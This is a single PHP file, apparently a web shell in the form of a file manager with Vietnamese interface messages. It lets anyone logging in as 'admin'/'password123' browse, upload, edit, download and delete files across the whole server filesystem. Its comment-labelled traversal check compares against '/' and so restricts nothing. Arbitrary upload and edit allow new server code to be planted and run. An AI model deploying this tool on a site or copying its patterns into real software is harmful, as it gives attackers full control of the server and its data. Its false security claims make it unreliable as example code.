<?php
// Error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Start session
session_start();

// Hardcoded credentials (for simplicity)
$adminUser = 'admin';
$adminPass = 'password123';

// Check if the user is already logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    // Handle login form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $adminUser && $_POST['password'] === $adminPass) {
            $_SESSION['loggedin'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid username or password!";
        }
    }

    // Show login form if not logged in
    echo '<style>
        /* General Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 0;
            padding-top: 50px;
            text-align: center;
        }

        h2 {
            color: #0073aa;
        }

        /* Alert Styles */
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            display: inline-block;
        }

        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        /* File List Styles */
        .file-list {
            list-style-type: none;
            padding: 0;
            text-align: left;
            display: inline-block;
        }

        .file-item {
            padding: 10px;
            border-bottom: 1px solid #ddd;
        }

        .file-link {
            text-decoration: none;
            color: #0073aa;
        }

        .file-link:hover {
            text-decoration: underline;
        }

        .file-action {
            text-decoration: none;
            color: #0073aa;
            margin-right: 10px;
        }

        .file-action:hover {
            text-decoration: underline;
        }

        /* Form Styles */
        form {
            margin-bottom: 20px;
            display: inline-block;
            text-align: left;
            max-width: 400px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"],
        input[type="file"],
        textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input[type="submit"],
        .btn {
            background-color: #0073aa;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            margin-top: 10px;
        }

        input[type="submit"]:hover,
        .btn:hover {
            background-color: #005a8d;
        }

        .upload-form {
            margin-top: 20px;
        }

        .upload-label {
            display: block;
            margin-bottom: 5px;
        }
    </style>';
    echo '<h2>Login</h2>';
    if (isset($error)) {
        echo '<p class="alert error">' . htmlspecialchars($error) . '</p>';
    }
    echo '<form method="post" action="">
        <label for="username">Username:</label>
        <input type="text" name="username" id="username" required>
        <label for="password">Password:</label>
        <input type="password" name="password" id="password" required>
        <input type="submit" value="Login">
    </form>';
    exit;
}

// Logout functionality
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Current directory
$rootDir = '/'; // Root directory is set to the root ('/') of the filesystem
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$realDir = realpath($dir);

// Security check to prevent directory traversal beyond the script's root directory
if (!$realDir || strpos($realDir, $rootDir) !== 0) {
    die("Access denied.");
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    $targetFile = $realDir . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
        echo "<div class='alert success'>Tập tin " . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . " đã được tải lên.</div>";
    } else {
        echo "<div class='alert error'>Xin lỗi, đã có lỗi khi tải tệp của bạn lên.</div>";
    }
}

// Handle file delete
if (isset($_GET['delete'])) {
    $fileToDelete = realpath($realDir . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($fileToDelete && strpos($fileToDelete, $rootDir) === 0 && is_file($fileToDelete)) {
        if (unlink($fileToDelete)) {
            echo "<div class='alert success'>Tập tin " . htmlspecialchars($_GET['delete']) . " đã bị xóa.</div>";
        } else {
            echo "<div class='alert error'>Xin lỗi, đã có lỗi khi xóa tập tin của bạn.</div>";
        }
    } else {
        echo "<div class='alert error'>Tệp không hợp lệ hoặc quyền truy cập bị từ chối.</div>";
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $fileToDownload = realpath($realDir . DIRECTORY_SEPARATOR . $_GET['download']);
    if ($fileToDownload && strpos($fileToDownload, $rootDir) === 0 && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    } else {
        echo "<div class='alert error'>Tệp không hợp lệ hoặc quyền truy cập bị từ chối.</div>";
    }
}

// Handle file edit
if (isset($_GET['edit'])) {
    $fileToEdit = realpath($realDir . DIRECTORY_SEPARATOR . $_GET['edit']);
    if ($fileToEdit && strpos($fileToEdit, $rootDir) === 0 && is_file($fileToEdit)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fileContent'])) {
            // Save the edited content back to the file
            file_put_contents($fileToEdit, $_POST['fileContent']);
            echo "<div class='alert success'>Tập tin " . htmlspecialchars($_GET['edit']) . " đã được lưu.</div>";
        }

        // Display the file content in a textarea
        $fileContent = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h2>Editing " . htmlspecialchars(basename($fileToEdit)) . "</h2>";
        echo '<style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                color: #333;
                margin: 0;
                padding: 20px;
            }
            h2 {
                color: #0073aa;
            }
            .btn {
                background-color: #0073aa;
                color: white;
                border: none;
                padding: 10px 15px;
                border-radius: 4px;
                cursor: pointer;
                text-decoration: none;
            }
            .btn:hover {
                background-color: #005a8d;
            }
            textarea {
                width: 100%;
                padding: 8px;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
                margin-bottom: 10px;
                font-family: monospace;
                font-size: 14px;
            }
            form {
                max-width: 800px;
                margin: auto;
            }
            a.cancel {
                margin-left: 10px;
            }
        </style>';
        echo '<form action="?dir=' . urlencode($realDir) . '&edit=' . urlencode(basename($fileToEdit)) . '" method="post">';
        echo '<textarea name="fileContent" rows="20" cols="80" class="edit-textarea">' . $fileContent . '</textarea><br>';
        echo '<input type="submit" value="Lưu thay đổi" class="btn">';
        echo '<a href="?" class="btn cancel">Hủy</a>';
        echo '</form>';
        exit;
    } else {
        echo "<div class='alert error'>Tệp không hợp lệ hoặc quyền truy cập bị từ chối.</div>";
    }
}

// Display directory contents
if ($handle = opendir($realDir)) {
    echo "<h2>Index of " . htmlspecialchars($realDir) . "</h2>";
    echo '<ul class="file-list">';
    // Parent directory link
    if ($realDir != $rootDir) {
        echo '<li class="file-item"><a href="?dir=' . urlencode(dirname($realDir)) . '" class="file-link">.. (Parent Directory)</a></li>';
    }

    // Read files and directories
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            $path = $realDir . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                echo '<li class="file-item"><a href="?dir=' . urlencode($path) . '" class="file-link">' . htmlspecialchars($entry) . '/</a></li>';
            } else {
                $encodedEntry = urlencode($entry);
                echo '<li class="file-item">' . htmlspecialchars($entry) . ' - ';
                echo '<a href="?dir=' . urlencode($realDir) . '&delete=' . $encodedEntry . '" class="file-action delete">Delete</a> | ';
                echo '<a href="?dir=' . urlencode($realDir) . '&download=' . $encodedEntry . '" class="file-action download">Download</a> | ';
                echo '<a href="?dir=' . urlencode($realDir) . '&edit=' . $encodedEntry . '" class="file-action edit">Edit</a> | ';
                echo '<a href="' . htmlspecialchars($path) . '" target="_blank" class="file-action view">View</a>';
                echo '</li>';
            }
        }
    }
    echo '</ul>';
    closedir($handle);
} else {
    echo "<div class='alert error'>Failed to open directory.</div>";
}
?>

<!-- File Upload Form -->
<h2>Upload a New File</h2>
<form action="" method="post" enctype="multipart/form-data" class="upload-form">
    <label for="fileToUpload" class="upload-label">Chọn tập tin để tải lên:</label>
    <input type="file" name="fileToUpload" id="fileToUpload" class="upload-input">
    <input type="submit" value="Tải lên tập tin" name="submit" class="btn">
</form>

<!-- Logout Link -->
<p><a href="?logout" class="btn">Đăng xuất</a></p>


<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
        color: #333;
        margin: 0;
        padding: 20px;
    }
    h2 {
        color: #444;
        border-bottom: 2px solid #ddd;
        padding-bottom: 10px;
    }
    .file-list {
        list-style: none;
        padding: 0;
    }
    .file-item {
        background: #fff;
        padding: 10px;
        margin-bottom: 5px;
        border-radius: 4px;
        border: 1px solid #ddd;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .file-link {
        text-decoration: none;
        color: #0066cc;
        font-weight: bold;
    }
    .file-action {
        margin-left: 10px;
        text-decoration: none;
        color: #666;
    }
    .file-action.delete {
        color: #e74c3c;
    }
    .file-action.download {
        color: #27ae60;
    }
    .file-action.edit {
        color: #f39c12;
    }
    .file-action.view {
        color: #2980b9;
    }
    .alert {
        padding: 15px;
        margin-bottom: 20px;
        border-radius: 4px;
    }
    .alert.success {
        background-color: #2ecc71;
        color: #fff;
    }
    .alert.error {
        background-color: #e74c3c;
        color: #fff;
    }
    .upload-form {
        background: #fff;
        padding: 20px;
        border-radius: 4px;
        border: 1px solid #ddd;
        margin-top: 20px;
    }
    .upload-label {
        display: block;
        margin-bottom: 10px;
        font-weight: bold;
    }
    .upload-input {
        margin-bottom: 10px;
    }
    .btn {
        background-color: #007bff;
        color: #fff;
        padding: 10px 15px;
        border: none;
        border-radius: 4px;
        text-decoration: none;
        cursor: pointer;
    }
    .btn.cancel {
        background-color: #6c757d;
    }
    .edit-textarea {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #ddd;
        border-radius: 4px;
    }
</style>

